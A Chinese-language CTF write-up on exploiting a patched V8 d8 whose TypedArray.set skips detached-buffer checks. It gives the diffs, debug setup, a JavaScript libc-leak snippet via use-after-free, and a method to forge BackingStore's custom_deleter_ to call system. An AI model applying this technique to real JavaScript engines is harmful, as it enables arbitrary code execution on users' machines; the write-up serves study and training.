## 题目描述
Enviroment: Ubuntu18.04
It’s v8, but it’s not a typical v8, it’s CTF v8! Please enjoy pwning this d8 🙂
Update: If you want to build one for debugging, please
```
git checkout f7a1932ef928c190de32dd78246f75bd4ca8778b
```
## patch分析
删去了对于是否是`Attached`状态的检查，默认都是Attached。这样就能读写已经被释放的chunk了。
```
diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq
index b5c9dcb261..babe7da3f0 100644
--- a/src/builtins/typed-array-set.tq
+++ b/src/builtins/typed-array-set.tq
@@ -70,7 +70,7 @@ TypedArrayPrototypeSet(
     // 7. Let targetBuffer be target.[[ViewedArrayBuffer]].
     // 8. If IsDetachedBuffer(targetBuffer) is true, throw a TypeError
     //   exception.
-    const utarget = typed_array::EnsureAttached(target) otherwise IsDetached;
+    const utarget = %RawDownCast<AttachedJSTypedArray>(target);

     const overloadedArg = arguments[0];
     try {
@@ -86,8 +86,7 @@ TypedArrayPrototypeSet(
       // 10. Let srcBuffer be typedArray.[[ViewedArrayBuffer]].
       // 11. If IsDetachedBuffer(srcBuffer) is true, throw a TypeError
       //   exception.
-      const utypedArray =
-          typed_array::EnsureAttached(typedArray) otherwise IsDetached;
+      const utypedArray = %RawDownCast<AttachedJSTypedArray>(typedArray);

       TypedArrayPrototypeSetTypedArray(
           utarget, utypedArray, targetOffset, targetOffsetOverflowed)
```

patch中删去了`import`和`--allow-native-syntax`的支持。这样`%DebugPrint`和`%SystemBreak`都不能用了，但`%ArrayBufferDetach`还能用，并且不需要加`--allow-native-syntax`参数。
```
--- a/src/parsing/parser.cc
+++ b/src/parsing/parser.cc
@@ -357,6 +357,11 @@ Expression* Parser::NewV8Intrinsic(const AstRawString* name,
   const Runtime::Function* function =
       Runtime::FunctionForName(name->raw_data(), name->length());

+  // Only %ArrayBufferDetach allowed
+  if (function->function_id != Runtime::kArrayBufferDetach) {
+    return factory()->NewUndefinedLiteral(kNoSourcePosition);
+  }
+
   // Be more permissive when fuzzing. Intrinsics are not supported.
   if (FLAG_fuzzing) {
     return NewV8RuntimeFunctionForFuzzing(function, args, pos);
```


为了方便调试，修改了patch，保留了`--allow-native-syntax`的支持
```
diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq
index b5c9dcb261..babe7da3f0 100644
--- a/src/builtins/typed-array-set.tq
+++ b/src/builtins/typed-array-set.tq
@@ -70,7 +70,7 @@ TypedArrayPrototypeSet(
     // 7. Let targetBuffer be target.[[ViewedArrayBuffer]].
     // 8. If IsDetachedBuffer(targetBuffer) is true, throw a TypeError
     //   exception.
-    const utarget = typed_array::EnsureAttached(target) otherwise IsDetached;
+    const utarget = %RawDownCast<AttachedJSTypedArray>(target);

     const overloadedArg = arguments[0];
     try {
@@ -86,8 +86,7 @@ TypedArrayPrototypeSet(
       // 10. Let srcBuffer be typedArray.[[ViewedArrayBuffer]].
       // 11. If IsDetachedBuffer(srcBuffer) is true, throw a TypeError
       //   exception.
-      const utypedArray =
-          typed_array::EnsureAttached(typedArray) otherwise IsDetached;
+      const utypedArray = %RawDownCast<AttachedJSTypedArray>(typedArray);

       TypedArrayPrototypeSetTypedArray(
           utarget, utypedArray, targetOffset, targetOffsetOverflowed)
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index 117df1cc52..9c6ca7275d 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -1339,9 +1339,9 @@ MaybeLocal<Context> Shell::CreateRealm(
     }
     delete[] old_realms;
   }
-  Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
   Local<Context> context =
-      Context::New(isolate, nullptr, global_template, global_object);
+      Context::New(isolate, nullptr, ObjectTemplate::New(isolate),
+                   v8::MaybeLocal<Value>());
   DCHECK(!try_catch.HasCaught());
   if (context.IsEmpty()) return MaybeLocal<Context>();
   InitializeModuleEmbedderData(context);
@@ -2285,9 +2282,9 @@ Local<Context> Shell::CreateEvaluationContext(Isolate* isolate) {
   // This needs to be a critical section since this is not thread-safe
   base::MutexGuard lock_guard(context_mutex_.Pointer());
   // Initialize the global objects
-  Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
   EscapableHandleScope handle_scope(isolate);
-  Local<Context> context = Context::New(isolate, nullptr, global_template);
+  Local<Context> context = Context::New(isolate, nullptr,
+                                        ObjectTemplate::New(isolate));
   DCHECK(!context.IsEmpty());
   if (i::FLAG_perf_prof_annotate_wasm || i::FLAG_vtune_prof_annotate_wasm) {
     isolate->SetWasmLoadSourceMapCallback(ReadFile);
```

## 调试环境搭建
在已有的v8源码文件夹内  
(记得`gclient sync`,不然v8gen会报错)
```
git checkout f7a1932ef928c190de32dd78246f75bd4ca8778b
gclient sync
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug
```
然后起一个attach.sh,而后用`gdb -x attach.sh`
```
file /path/to/v8/out.gn/x64.debug/d8
set args --allow-natives-syntax exp.js
set follow-fork-mode parent
```

### 无SystemBreak调试
如果不自己编译源码，因为没给`%SystemBreak()`,可以在js中加入数学运算`Math.cosh(1);`，然后gdb在运算处下断点`b v8::base::ieee754::cosh`，当执行到cosh时，给`malloc`和`calloc`下断点即可。
例如
```
function break_point(){
    Math.cosh(1);
}
break_point();
var arr1 = new ArrayBuffer(48);
break_point();
```
## 利用
常规的利用是通过UAF，利用tcache dup来改写free hook块为system。这个可参见https://www.anquanke.com/post/id/209401#h2-0  

此处用的是[PwnThyBytes](https://fineas.github.io/FeDEX/post/chromium_rce.html)的思路,通过改写`BackingStore`中的`custom_deleter_`来执行system。
### JSArray结构
例如有一个`var a = [1,2,3];`的JSArray，v8通过称为`Map`/`Shape`的内部类来管理它。
![](https://upload-images.jianshu.io/upload_images/13348817-26deff1c74e48c92.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)  

但是`array`中的每个元素都是存储在`Elements Backing Store`中。
[Backing Store](https://v8docs.nodesource.com/node-14.1/d2/dbf/classv8_1_1_backing_store.html)只保存每个元素的value。

因此当JSArray持有对`BackingStore`引用时，它处于`Attached`状态。当JSArray失去对`BackingStore`引用时，它处于`Detached`状态。


ArrayBuffer(JSArrayBufferd)的View方式
> An ArrayBuffer is more than just a simple array. It contains raw binary data. This is very useful for direct memory manipulation and conserving space. When you create a normal array, you won't get a proper set of contiguous memory in many cases since arrays can contain any combination of different kinds of objects With an ArrayBuffer, you have the option of moving through that data on the byte level by using Views:
Typed Arrays (Uint8Array, Int16Array, Float32Array, etc.) interpret the ArrayBuffer as an indexed sequence of elements of a single type.
Instances of DataView let you access data as elements of several types (Uint8, Int16, Float32, etc.), at any byte offset inside an ArrayBuffer.

大意是，`Typed Arrays`是一片连续的内存，包含同类型元素。通过`DataView`的方式可以索引`ArrayBuffer`中的数据(可以以不同的数据类型，字节序读取数据)

`v8::internal::JSArrayBuffer`内存结构
```
Offset: 0x00 | Map Offset
Offset: 0x08 | Properties Offset
Offset: 0x10 | Elements Offset
Offset: 0x18 | Byte Length
Offset: 0x20 | Backing Store
Offset: 0x28 | Allocation Base
Offset: 0x30 | Allocation Length
Offset: 0x38 | Bit Field
```
其中存在的指针压缩，可参考https://v8.dev/blog/pointer-compression。
例如
```console
DebugPrint: 0x230c080c4021: [JSArrayBuffer]
 - map: 0x230c08281189 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x230c08246b99 <Object map = 0x230c082811b1>
 - elements: 0x230c080406e9 <FixedArray[0]> [HOLEY_ELEMENTS]
 - embedder fields: 2
 - backing_store: 0x555555724c70
 - byte_length: 48
 - detachable
 - properties: 0x230c080406e9 <FixedArray[0]> {}
 - embedder fields = {
    0, aligned pointer: (nil)
    0, aligned pointer: (nil)
 }
0x230c08281189: [Map]
 - type: JS_ARRAY_BUFFER_TYPE
 - instance size: 56
 - inobject properties: 0
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x230c0804030d <undefined>
 - prototype_validity cell: 0x230c081c0451 <Cell value= 1>
 - instance descriptors (own) #0: 0x230c080401b5 <DescriptorArray[0]>
 - prototype: 0x230c08246b99 <Object map = 0x230c082811b1>
 - constructor: 0x230c08246ac9 <JSFunction ArrayBuffer (sfi = 0x230c081cb1c5)>
 - dependent code: 0x230c080401ed <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

```
调试的时候发现，DebugPrint出的JSArrayBuffer地址比内存中的布局地址大`0xd`个字节。

即此处`0x230c080c4021-0xd=0x230c080c4014`
```
pwndbg> telescope 0x230c080c4021-0xd
00:0000│   0x230c080c4014 ◂— 0x0
01:0008│   0x230c080c401c ◂— 0x828118900000000
02:0010│   0x230c080c4024 ◂— 0x80406e9080406e9
03:0018│   0x230c080c402c ◂— 0x30 /* '0' */
04:0020│   0x230c080c4034 —▸ 0x555555724c70 ◂— 0x0  // back store
05:0028│   0x230c080c403c —▸ 0x5555556981b0 ◂— 0x0  // Allocation Base
06:0030│   0x230c080c4044 ◂— 0x2
07:0038│   0x230c080c404c ◂— 0x0
```
back store`的地址为`0x555555724c70`,可知`back store`的chunk大小为0x40，内容大小为`0x30`
```
pwndbg> heap 0x555555724c70-0x10
Allocated chunk | PREV_INUSE
Addr: 0x555555724c60
Size: 0x41
```

在`arrayBuffer(SIZE)`创建的时候，还会申请如下大小的内存
- calloc(SIZE) for the `Data buffer`
- malloc(48) for the `BackingStore`
- malloc(32) for the `shared_ptr`
- malloc(40) for the `ArrayBufferExtension`

当`Detach`一个array的时候(即`%ArrayBufferDetach`)，前三个chunks(`Data buffer`)会被释放

### 泄露libc
通过UAF残留的bk和fk

`.set()`方法可以将`undetached buffer`中的内容复制到新buffer，从而获取(泄露)`undetached buffer`中的残留。
```
var a = new ArrayBuffer(8 * 1000);
var a_view1 = new Uint8Array(a);
var a_view2 = new BigUint64Array(a);

var b = new ArrayBuffer(8 * 1000);
var b_view1 = new Uint8Array(b);
var b_view2 = new BigUint64Array(b);

%ArrayBufferDetach(a);

b_view1.set(a_view1);

console.log('[*] leak = 0x'+b_view2[1].toString(16));

libc_base=b_view2[1]-0x3ebca0n;
```
### 控制程序流
[BackingStore的构造函数](https://source.chromium.org/chromium/chromium/src/+/master:v8/src/objects/backing-store.h;drc=92402e1a4b9182848bdc7b9c6ee9f88753703abe;l=146)
```
  BackingStore(void* buffer_start, size_t byte_length, size_t byte_capacity,
               SharedFlag shared, bool is_wasm_memory, bool free_on_destruct,
               bool has_guard_regions, bool custom_deleter, bool empty_deleter)
      : buffer_start_(buffer_start),
        byte_length_(byte_length),
        byte_capacity_(byte_capacity),
        is_shared_(shared == SharedFlag::kShared),
        is_wasm_memory_(is_wasm_memory),
        holds_shared_ptr_to_allocator_(false),
        free_on_destruct_(free_on_destruct),
        has_guard_regions_(has_guard_regions),
        globally_registered_(false),
        custom_deleter_(custom_deleter),
        empty_deleter_(empty_deleter) {}
```
其中有`custom_deleter_`变量
检查`custom_deleter_`是否存在，然后通过调用callback，参数为buffer中的内容。
[backing-store.cc中custom_deleter_](https://source.chromium.org/chromium/chromium/src/+/master:v8/src/objects/backing-store.cc;drc=92402e1a4b9182848bdc7b9c6ee9f88753703abe;l=199)
```
  if (custom_deleter_) {
    DCHECK(free_on_destruct_);
    TRACE_BS("BS:custome deleter bs=%p mem=%p (length=%zu, capacity=%zu)\n",
             this, buffer_start_, byte_length(), byte_capacity_);
    type_specific_data_.deleter.callback(buffer_start_, byte_length_,
                                         type_specific_data_.deleter.data);
    Clear();
    return;
  }
```
通过伪造custom_deleter_为system，就可以执行system，其参数就是arrayBuffer中的内容了。
查看`backing store`内存布局
```
pwndbg> tele 0x555555724930-0x10 10
00:0000│   0x555555724920 ◂— 0x0
01:0008│   0x555555724928 ◂— 0x41 // chunk size
02:0010│   0x555555724930 —▸ 0x555555724970  // buffer start
03:0018│   0x555555724938 ◂— 0x30   //len
... ↓  // capacity (0x30)
05:0028│   0x555555724948 —▸ 0x7fffffffd750 —▸ 0x555555659b60 —▸ 0x55555560dad0 ◂— push   rbp // deleter_
06:0030│   0x555555724950 ◂— 0x5d203d3d3d3d3d3d ('====== ]')
07:0038│   0x555555724958 ◂— 0x3e293563316208 // flags
08:0040│   0x555555724960 —▸ 0x555555724968 ◂— 0x41 /* 'A' */

```
为了控制`BackingStore`结构体，
- 创建大小48的ArrayBuffer并释放，此时有3个chunks被free(分别为48字节的content块，32字节的shared_ptr块，48字节的BackStore块)
-  创建32字节大小的ArrayBuffer(此时会使用之前释放的32字节的shared_ptr块，48字节的BackStore块)
- 再创建一个大的ArrayBuffer(大小不是48字节即可)，这样新的ArrayBuffer中BackStore为第一次ArrayBuffer中的content块，而后使用`.set()`改写第一次ArrayBuffer中的content为另外布置好的ArrayBuffer(即再创建一个ArrayBuffer，其内容为伪造的BackStore)

此时detach大的ArrayBuffer即可触发system，大ArrayBuffer的内容为执行的命令。

## reference
- https://fineas.github.io/FeDEX/post/chromium_rce.html
- https://developer.mozilla.org/en-US/docs/Web/JavaScript/Typed_arrays
